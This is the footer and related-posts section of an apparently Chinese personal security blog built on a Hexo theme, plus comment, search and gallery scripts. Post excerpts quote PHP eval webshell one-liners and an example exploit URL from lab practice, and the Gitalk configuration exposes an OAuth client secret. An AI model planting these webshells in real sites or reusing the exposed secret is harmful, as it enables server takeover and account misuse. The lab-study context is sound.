		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<!-- <div>分享</div> -->
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">
								Docker基础与架构			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 19日, 2024				
							</p>
							<p class="relate-post-content">
								一、Docker进程与Linux进程Link: https://zhuanlan.zhihu.com/p/537982888
1.1 Linux的forkLinux：由父进程创建并执行子进程，创建通过fork完成，执行通过exec完成...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/docker.jpg" alt="Docker基础与架构"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" title="K8S靶场-Kubernetes Goat">
								K8S靶场-Kubernetes Goat			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								八月 29日, 2024				
							</p>
							<p class="relate-post-content">
								0 先验知识https://madhuakula.com/kubernetes-goat/docs/kubernetes-goat-architecture
0.1 K8S Goat架构
0.2 K8S介绍每个K8S集群至少有一个工作...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" title="K8S靶场-Kubernetes Goat">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/K8S.jpg" alt="K8S靶场-Kubernetes Goat"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/07/18/Linux-VFS/" title="Linux VFS">
								Linux VFS			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								七月 18日, 2024				
							</p>
							<p class="relate-post-content">
								七、Linux VFS



主要是VFS——虚拟文件系统：
提供了统一的文件模型（common file model），底层具体的文件系统负责具体实现这种文件模型

抽象，统一表示

7.0 统一文件模型文件存在硬盘上，硬盘的最小存...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/07/18/Linux-VFS/" title="Linux VFS">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux VFS"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">
								Golang学习笔记			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 9日, 2024				
							</p>
							<p class="relate-post-content">
								一、菜鸟&#x3D;&#x3D;学了基础中的基础语法&#x3D;&#x3D;
1.1 Go语言结构.go文件必须在非注释的第一行指明这个文件属于哪个包，如：package main
每一个可执行文件都必须包含main函数，一般来说都是...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Golang.png" alt="Golang学习笔记"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">
								namespace、cgroup与capabilities			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 25日, 2024				
							</p>
							<p class="relate-post-content">
								一、namespace1.1 类型


Namespace
Flag
Page
Isolates



Cgroup
CLONE_NEWCGROUP
cgroup_namespaces(7)
Cgroup root directory...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="namespace、cgroup与capabilities"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">
								Web漏洞整理-SQLi			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								七月 7日, 2023				
							</p>
							<p class="relate-post-content">
								[NOTE] SQLi前言主要是之前练习了很多靶场所设计到的SQLi的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA、sql...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln1.jpg" alt="Web漏洞整理-SQLi"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
								Linux攻防-权限维持及痕迹隐藏			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 17日, 2023				
							</p>
							<p class="relate-post-content">
								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
这里主要分为两大类：

权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
痕迹隐藏：能够使...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
								Web靶场-upload-labs			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 4日, 2023				
							</p>
							<p class="relate-post-content">
								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
Pass-01任务：上传一个webshell到服务器
直接怼，显示：

改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
								PHP-Web渗透中常见的高危函数以及伪协议			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 4日, 2023				
							</p>
							<p class="relate-post-content">
								代码执行函数eval
代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
利用：http://10.10.10.3/test.php?cmd=phpinfo();
assert
代码：&lt;?...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
								Webshell流量分析			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 1日, 2023				
							</p>
							<p class="relate-post-content">
								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
用的某个工具包里的菜刀，流量如下：

agent有火狐5.0以及百度
连接密码开头，用了array_map封装命令执行函数，...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	

		

			<!-- gitalk comment -->
			<!-- show gitalk comment -->
<div id="gitalk-container"></div>

<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">

	(function gitalkComment(){
		//Thanks O-R
		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
		//去除尾部匹配正则数组的字符串  
		//Remove redundant characters
		String.prototype.trimEnd = function(regStr) {
			let result = this;
			if(regStr == undefined || regStr == null || regStr == "") {
				return result;
			}
			let array = regStr.split(',');

			if(array.length > 0) {

				let c = array.shift(), 
					str = this,
					i = str.length,
					rg = new RegExp(c),
					matchArr = str.match(rg);

				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
					matchStr = matchStr + '$';
					result = str.replace(new RegExp(matchStr), "");
				}

				if(array.length > 0) {
					return result.trimEnd(array.join())
				} else {
					return result;
				}
			}
		};

		//Create gitalk
		let gitalk = new Gitalk({
			clientID: 'Ov23liAb4iwJ1VAXeknf',
			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
			//id: window.location.pathname,
			//id: decodeURI(window.location.pathname),
			//id: (window.location.pathname).split("/").pop().substring(0, 49),
			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
			repo: 'Blog-Gitalk',
			owner: 'ArcheriShade',
			admin: 'ArcheriShade',
			distractionFreeMode: 'true',
		})
		gitalk.render('gitalk-container');		
	})();
</script>

		
		
	

</div>
				</div>
				<!-- <div class="investment-content-list">
					<div class="layout-share">
	
	
		<div class="config-info">
			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
		</div>	
	
</div>


				</div> -->
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	
<script src="/plugin/clipboard/clipboard.js"></script>

	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>






<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">


<script src="/plugin/fancybox/jquery.fancybox.js"></script>


<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2024, content by ArcheriShade. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->



			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	
<script src="/plugin/motto/motto.js"></script>

	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->


<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	
	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


	

  

	<!--
	时间：2018-10-3
	描述：
		插件名称：hexo-generator-search-zip
		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
-->
<div class="popup search-popup local-search-popup scrollbar" >
	<div class="local-search-container">
		<span class="popup-btn-close">
      		ESC
   		</span>
		<div class="local-search-header">
			<div class="input-prompt">				
			</div>
			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
		</div>
		<div class="local-search-body">
			<div id="local-search-output"></div>
		</div>
		<div class="local-search-footer">
			<div class="topN-post">				
				
								
			</div>
		</div>
	</div>
</div>


<script src="/plugin/search/ziploader.js"></script>
<script src="/js/search.js"></script>


<script type="text/javascript">
	var search_path = 'search.json',
		zip_Path = '/search.zip',
		version_Path = '/searchVersion.txt',
		input_Trigger = 'auto',
		top_N = '2';

	themeLocalSearch({
		search_path, 
		zip_Path, 
		version_Path, 
		input_Trigger, 
		top_N
	});
</script>



<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>

	</body>	
</html>